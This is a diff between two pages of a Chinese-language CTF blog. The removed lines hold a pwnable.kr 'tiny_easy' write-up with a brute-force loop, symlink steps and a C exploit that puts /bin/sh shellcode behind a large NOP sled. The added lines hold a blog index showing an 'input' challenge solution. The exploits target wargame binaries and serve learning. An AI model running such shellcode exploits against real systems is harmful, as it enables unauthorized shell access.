@@ -68,7 +68,7 @@
 <link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="Pwnable," />
+  <meta name="keywords" content="Hexo, NexT" />
 
 
 
@@ -84,25 +84,15 @@
 
 
 
-<meta name="description" content="Trick暴力暴力暴力。
-payload里放了一个长度0xff00的sled 。
-tiny_easy@ubuntu:/tmp/pwn$ while truedo./pwndone
-Conclusion刚开始没有想到，也是参考了别人的做法。没想到的原因还是太粗心了，在gdb-peda里用checksec看了下，发现开启了NX，以为stack肯定是unexcutable。但是看了别人的writeup后">
-<meta property="og:type" content="article">
-<meta property="og:title" content="pwnable.kr-rookiss-tiny-easy">
-<meta property="og:url" content="http://0byjwzsf.me/2016/07/27/pwnable-rookiss-tiny-easy/index.html">
+<meta name="description" content="Dive dive dive into Binary">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Icemakr's Blog">
+<meta property="og:url" content="http://0byjwzsf.me/page/5/index.html">
 <meta property="og:site_name" content="Icemakr's Blog">
-<meta property="og:description" content="Trick暴力暴力暴力。
-payload里放了一个长度0xff00的sled 。
-tiny_easy@ubuntu:/tmp/pwn$ while truedo./pwndone
-Conclusion刚开始没有想到，也是参考了别人的做法。没想到的原因还是太粗心了，在gdb-peda里用checksec看了下，发现开启了NX，以为stack肯定是unexcutable。但是看了别人的writeup后">
-<meta property="og:updated_time" content="2016-08-08T08:08:44.000Z">
+<meta property="og:description" content="Dive dive dive into Binary">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="pwnable.kr-rookiss-tiny-easy">
-<meta name="twitter:description" content="Trick暴力暴力暴力。
-payload里放了一个长度0xff00的sled 。
-tiny_easy@ubuntu:/tmp/pwn$ while truedo./pwndone
-Conclusion刚开始没有想到，也是参考了别人的做法。没想到的原因还是太粗心了，在gdb-peda里用checksec看了下，发现开启了NX，以为stack肯定是unexcutable。但是看了别人的writeup后">
+<meta name="twitter:title" content="Icemakr's Blog">
+<meta name="twitter:description" content="Dive dive dive into Binary">
 
 
 
@@ -123,9 +113,9 @@ Conclusion刚开始没有想到，也是参考了别人的做法。没想到的�
 
 
 
-  <link rel="canonical" href="http://0byjwzsf.me/2016/07/27/pwnable-rookiss-tiny-easy/"/>
+  <link rel="canonical" href="http://0byjwzsf.me/page/5/"/>
 
-  <title> pwnable.kr-rookiss-tiny-easy | Icemakr's Blog </title>
+  <title> Icemakr's Blog </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -156,7 +146,9 @@ Conclusion刚开始没有想到，也是参考了别人的做法。没想到的�
     
   
 
-  <div class="container one-collumn sidebar-position-left page-post-detail ">
+  <div class="container one-collumn sidebar-position-left 
+   page-home 
+ ">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -273,9 +265,9 @@ Conclusion刚开始没有想到，也是参考了别人的做法。没想到的�
         <div class="content-wrap">
           <div id="content" class="content">
             
-
-  <div id="posts" class="posts-expand">
+  <section id="posts" class="posts-expand">
     
+      
 
   
   
@@ -295,7 +287,10 @@ Conclusion刚开始没有想到，也是参考了别人的做法。没想到的�
             
             
               
-                pwnable.kr-rookiss-tiny-easy
+                
+                <a class="post-title-link" href="/2016/07/20/pwnable-toddler-s-bottle/" itemprop="url">
+                  pwnable.kr-toddler-s-bottle
+                </a>
               
             
           </h1>
@@ -307,8 +302,8 @@ Conclusion刚开始没有想到，也是参考了别人的做法。没想到的�
               <i class="fa fa-calendar-o"></i>
             </span>
             <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-07-27T00:00:00+08:00" content="2016-07-27">
-              2016-07-27
+            <time itemprop="dateCreated" datetime="2016-07-20T00:00:00+08:00" content="2016-07-20">
+              2016-07-20
             </time>
           </span>
 
@@ -337,8 +332,8 @@ Conclusion刚开始没有想到，也是参考了别人的做法。没想到的�
             
               <span class="post-comments-count">
                 &nbsp; | &nbsp;
-                <a href="/2016/07/27/pwnable-rookiss-tiny-easy/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/07/27/pwnable-rookiss-tiny-easy/" itemprop="commentsCount"></span>
+                <a href="/2016/07/20/pwnable-toddler-s-bottle/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/07/20/pwnable-toddler-s-bottle/" itemprop="commentsCount"></span>
                 </a>
               </span>
             
@@ -361,74 +356,50 @@ Conclusion刚开始没有想到，也是参考了别人的做法。没想到的�
       
 
       
-        <h2 id="Trick">Trick</h2><p>暴力暴力暴力。</p>
-<p>payload里放了一个长度0xff00的<code>sled</code> 。</p>
-<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">tiny_easy<span class="variable">@ubuntu</span><span class="symbol">:/tmp/pwn</span><span class="variable">$ </span><span class="keyword">while</span> <span class="keyword">true</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">./pwn</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
-<h2 id="Conclusion">Conclusion</h2><p>刚开始没有想到，也是参考了别人的做法。没想到的原因还是太粗心了，在gdb-peda里用<code>checksec</code>看了下，发现开启了<code>NX</code>，以为stack肯定是unexcutable。但是看了别人的writeup后才发现原来stack是可执行的。（起始我之前也<code>vmmap</code>过。可能是眼花了没看到。）</p>
-<p>我的利用方法是写了个c程序，用<code>execve</code>函数直接控制<code>argv[0]</code>，然后把代码扔到服务器<code>/tmp</code>下编译，另外也可以像引文里，改变环境变量和利用软链接来控制程序执行时的<code>argv[0]</code></p>
-<p>这种做法步骤大致如下</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">mkdir /tmp/pwn</span><br><span class="line">ln <span class="operator">-s</span> /tmp/pwn/tiny_easy /home/tiny_easy/tiny_easy`</span><br><span class="line"><span class="built_in">export</span> PATH=/tmp/pwn:<span class="variable">$PATH</span></span><br><span class="line">whilt <span class="literal">true</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">tiny_easy [payload]</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
-<h2 id="Exploit">Exploit</h2><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line"><span class="special">#</span>include &lt;stdio.h&gt;</span><br><span class="line"><span class="special">#</span>include &lt;string.h&gt;</span><br><span class="line">char shellcode<span class="special">[</span><span class="special">]</span> =</span><br><span class="line">        "<span class="command">\xeb</span><span class="command">\x</span>1a<span class="command">\x</span>5e<span class="command">\x</span>31<span class="command">\xc</span>0<span class="command">\x</span>88<span class="command">\x</span>46<span class="command">\x</span>07<span class="command">\x</span>8d<span class="command">\x</span>1e<span class="command">\x</span>89<span class="command">\x</span>5e<span class="command">\x</span>08<span class="command">\x</span>89<span class="command">\x</span>46"</span><br><span class="line">        "<span class="command">\x</span>0c<span class="command">\xb</span>0<span class="command">\x</span>0b<span class="command">\x</span>89<span class="command">\xf</span>3<span class="command">\x</span>8d<span class="command">\x</span>4e<span class="command">\x</span>08<span class="command">\x</span>8d<span class="command">\x</span>56<span class="command">\x</span>0c<span class="command">\xcd</span><span class="command">\x</span>80<span class="command">\xe</span>8<span class="command">\xe</span>1"</span><br><span class="line">        "<span class="command">\xff</span><span class="command">\xff</span><span class="command">\xff</span><span class="command">\x</span>2f<span class="command">\x</span>62<span class="command">\x</span>69<span class="command">\x</span>6e<span class="command">\x</span>2f<span class="command">\x</span>73<span class="command">\x</span>68";</span><br><span class="line">char payload<span class="special">[</span>0x10000<span class="special">]</span>;</span><br><span class="line"></span><br><span class="line">int main(int argc, const char *argv<span class="special">[</span><span class="special">]</span>)</span><br><span class="line"><span class="special">&#123;</span></span><br><span class="line">    int i = 0;</span><br><span class="line">    for (i = 0; i &lt; 0xff00; i++)<span class="special">&#123;</span></span><br><span class="line">        payload<span class="special">[</span>i<span class="special">]</span> = '<span class="command">\x</span>90';</span><br><span class="line">    <span class="special">&#125;</span></span><br><span class="line">    strcpy(payload + 0xff00, shellcode);</span><br><span class="line"></span><br><span class="line">    char *my_argv<span class="special">[</span><span class="special">]</span> = <span class="special">&#123;</span>"<span class="command">\x</span>38<span class="command">\x</span>5c<span class="command">\xe</span>3<span class="command">\xff</span>", NULL<span class="special">&#125;</span>;</span><br><span class="line">    char *my_env<span class="special">[</span><span class="special">]</span>  = <span class="special">&#123;</span>payload, NULL<span class="special">&#125;</span>;</span><br><span class="line">    execve("./tiny_easy", my_argv, my_env);</span><br><span class="line">    return 0;</span><br><span class="line"><span class="special">&#125;</span></span><br></pre></td></tr></table></figure>
-<h2 id="Referance">Referance</h2><p><a href="https://gist.github.com/ihciah/b921fe522244e5b70e7a" target="_blank" rel="external">https://gist.github.com/ihciah/b921fe522244e5b70e7a</a></p>
-<p><a href="http://www.secbox.cn/hacker/ctf/5547.html" target="_blank" rel="external">http://www.secbox.cn/hacker/ctf/5547.html</a></p>
-
+        
+          <h2 id="input">input</h2><p>这道题考察了很多Linux基础知识，关于命令行参数的传递，进程间通信，文件重定向，管道，socket等等</p>
+<h3 id="Trick">Trick</h3><ul>
+<li>因为在家目录下没有写权限，代码copy到服务器/tmp目录下，并且创建一个软链接，链接到目标flag文件，然后编译运行程序就可以了</li>
+</ul>
+<h3 id="Exploit">Exploit</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> *argv[])</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="comment">/* stage 1 */</span></span><br><span class="line">    <span class="keyword">int</span>     i   = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span>     pid = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span>    *my_argv[<span class="number">101</span>]; </span><br><span class="line">    <span class="keyword">char</span>    *my_env[<span class="number">2</span>]; </span><br><span class="line">    <span class="keyword">int</span>     pipe_fd0[<span class="number">2</span>]; </span><br><span class="line">    <span class="keyword">int</span>     pipe_fd2[<span class="number">2</span>]; </span><br><span class="line"></span><br><span class="line">    setenv(<span class="string">"PATH"</span>, <span class="string">"/home/ctf"</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">char</span> *path = (<span class="keyword">char</span> *)getenv(<span class="string">"PATH"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>, path);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pipe(pipe_fd0) &lt; <span class="number">0</span> || pipe(pipe_fd2) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"pipe0 create error\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;i &lt; <span class="number">100</span>; i++)&#123;</span><br><span class="line">        my_argv[i] = <span class="string">"AAAA"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    my_argv[<span class="string">'A'</span>] = <span class="string">"\x00"</span>; </span><br><span class="line">    my_argv[<span class="string">'B'</span>] = <span class="string">"\x20\x0a\x0d"</span>; </span><br><span class="line">    my_argv[<span class="string">'C'</span>] = argv[<span class="number">1</span>]; </span><br><span class="line">    my_argv[<span class="number">100</span>] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((pid == fork()) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="comment">/* child */</span></span><br><span class="line">        close(pipe_fd0[<span class="number">1</span>]);</span><br><span class="line">        close(pipe_fd2[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        dup2(pipe_fd0[<span class="number">0</span>], <span class="number">0</span>);</span><br><span class="line">        dup2(pipe_fd2[<span class="number">0</span>], <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* stage 3 */</span></span><br><span class="line">        my_env[<span class="number">0</span>] = <span class="string">"\xde\xad\xbe\xef=\xca\xfe\xba\xbe"</span>;</span><br><span class="line">        my_env[<span class="number">1</span>] = <span class="literal">NULL</span>;</span><br><span class="line">        execve(<span class="string">"/home/ctf/pwn/input"</span>, my_argv, my_env);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (pid == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="comment">/* parent */</span></span><br><span class="line">        <span class="comment">/* stage 2 */</span></span><br><span class="line">        close(pipe_fd0[<span class="number">0</span>]);</span><br><span class="line">        close(pipe_fd2[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">        write(pipe_fd0[<span class="number">1</span>], <span class="string">"\x00\x0a\x00\xff"</span>, <span class="number">4</span>);</span><br><span class="line">        write(pipe_fd2[<span class="number">1</span>], <span class="string">"\x00\x0a\x02\xff"</span>, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* stage 4 */</span></span><br><span class="line">        FILE *fp = fopen(<span class="string">"\x0a"</span>, <span class="string">"w"</span>);</span><br><span class="line">        fwrite(<span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, fp);</span><br><span class="line">        fclose(fp);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* stage 5 */</span></span><br><span class="line">        <span class="keyword">struct</span> sockaddr_in  serv;</span><br><span class="line">        <span class="keyword">int</span>                 sd;</span><br><span class="line"></span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        bzero(&amp;serv, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in));</span><br><span class="line">        serv.sin_family         = AF_INET;</span><br><span class="line">        serv.sin_port           = htons(atoi(argv[<span class="number">1</span>]));</span><br><span class="line">        serv.sin_addr.s_addr    = inet_addr(<span class="string">"127.0.0.1"</span>);</span><br><span class="line">        sd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">        connect(sd, (<span class="keyword">const</span> <span class="keyword">struct</span> sockaddr *)&amp;serv, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr));</span><br><span class="line">        send(sd, <span class="string">"\xde\xad\xbe\xef"</span>, <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+          <div class="post-more-link text-center">
+            <a class="btn" href="/2016/07/20/pwnable-toddler-s-bottle/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+        
       
     </div>
 
     <div>
       
-        
-
-      
     </div>
 
     <div>
-      
-        
-
       
     </div>
 
     <footer class="post-footer">
       
-        <div class="post-tags">
-          
-            <a href="/tags/Pwnable/" rel="tag">#Pwnable</a>
-          
-        </div>
+
       
 
       
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
-            
-              <a href="/2016/07/26/pwnable-rookiss-simple-login/" rel="next" title="pwnable.kr-rookiss-simple-login">
-                <i class="fa fa-chevron-left"></i> pwnable.kr-rookiss-simple-login
-              </a>
-            
-          </div>
-
-          <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2016/07/28/pwnable-rookiss-dragon/" rel="prev" title="pwnable.kr-rookiss-dragon">
-                pwnable.kr-rookiss-dragon <i class="fa fa-chevron-right"></i>
-              </a>
-            
-          </div>
-        </div>
       
-
-      
+        <div class="post-eof"></div>
       
     </footer>
   </article>
 
 
+    
+  </section>
 
-    <div class="post-spread">
-      
-    </div>
-  </div>
+  
+  <nav class="pagination">
+    <a class="extend prev" rel="prev" href="/page/4/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span>
+  </nav>
+
 
 
           </div>
@@ -436,17 +407,6 @@ Conclusion刚开始没有想到，也是参考了别人的做法。没想到的�
 
 
           
-  <div class="comments" id="comments">
-    
-      <div id="disqus_thread">
-        <noscript>
-          Please enable JavaScript to view the
-          <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a>
-        </noscript>
-      </div>
-    
-  </div>
-
 
         </div>
         
@@ -466,17 +426,8 @@ Conclusion刚开始没有想到，也是参考了别人的做法。没想到的�
       
 
       
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
-            文章目录
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview">
-            站点概览
-          </li>
-        </ul>
-      
 
-      <section class="site-overview sidebar-panel ">
+      <section class="site-overview sidebar-panel  sidebar-panel-active ">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
           <img class="site-author-image" itemprop="image"
                src="/images/author.jpg"
@@ -537,17 +488,6 @@ Conclusion刚开始没有想到，也是参考了别人的做法。没想到的�
 
       </section>
 
-      
-        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-            
-              
-            
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Trick"><span class="nav-number">1.</span> <span class="nav-text">Trick</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Conclusion"><span class="nav-number">2.</span> <span class="nav-text">Conclusion</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit"><span class="nav-number">3.</span> <span class="nav-text">Exploit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Referance"><span class="nav-number">4.</span> <span class="nav-text">Referance</span></a></li></ol></div>
-            
-          </div>
-        </section>
       
 
     </div>
@@ -651,10 +591,6 @@ Conclusion刚开始没有想到，也是参考了别人的做法。没想到的�
 
 
   
-  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
-<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>
-
-
 
   
 
@@ -671,9 +607,9 @@ Conclusion刚开始没有想到，也是参考了别人的做法。没想到的�
 
     <script type="text/javascript">
       var disqus_shortname = '0byjwzsf';
-      var disqus_identifier = '2016/07/27/pwnable-rookiss-tiny-easy/';
-      var disqus_title = "pwnable.kr-rookiss-tiny-easy";
-      var disqus_url = 'http://0byjwzsf.me/2016/07/27/pwnable-rookiss-tiny-easy/';
+      var disqus_identifier = 'page/5/index.html';
+      var disqus_title = "";
+      var disqus_url = '';
 
       function run_disqus_script(disqus_script){
         var dsq = document.createElement('script');
@@ -684,8 +620,6 @@ Conclusion刚开始没有想到，也是参考了别人的做法。没想到的�
       }
 
       run_disqus_script('count.js');
-      
-        run_disqus_script('embed.js');
       
     </script>
   
